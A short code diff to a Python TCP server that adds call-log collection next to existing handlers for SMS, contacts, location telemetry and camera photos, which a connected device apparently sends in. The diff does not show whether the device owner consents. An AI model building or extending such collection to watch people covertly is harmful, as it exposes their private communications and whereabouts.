@@ -11,6 +11,7 @@ from app.state import state
 from app.tcp.commands import send_command
 from app.tcp.dispatcher import fail_all_pending, resolve_pending
 from app.tcp.handlers import (
+    process_call_logs_data,
     process_cams_data,
     process_sms_data,
     process_telemetry_data,
@@ -87,6 +88,12 @@ async def reader_loop(reader: asyncio.StreamReader, writer: asyncio.StreamWriter
                 res = process_sms_data(messages, hours)
                 resolve_pending("sms", {"status": "ok", "data": res})
 
+            elif msg_type == "call_logs":
+                calls = header.get("data", [])
+                hours = header.get("hours", 24)
+                res = process_call_logs_data(calls, hours)
+                resolve_pending("call_logs", {"status": "ok", "data": res})
+
             elif msg_type == "cams":
                 if settings.enable_camera:
                     cams = header.get("data", [])
@@ -116,6 +123,8 @@ async def reader_loop(reader: asyncio.StreamReader, writer: asyncio.StreamWriter
                         target_key = "contacts"
                     elif "sms" in msg_lower:
                         target_key = "sms"
+                    elif "call" in msg_lower:
+                        target_key = "call_logs"
                     elif "telemetry" in msg_lower or "location" in msg_lower:
                         target_key = "telemetry"
                     elif "cam" in msg_lower or "photo" in msg_lower or "picture" in msg_lower:
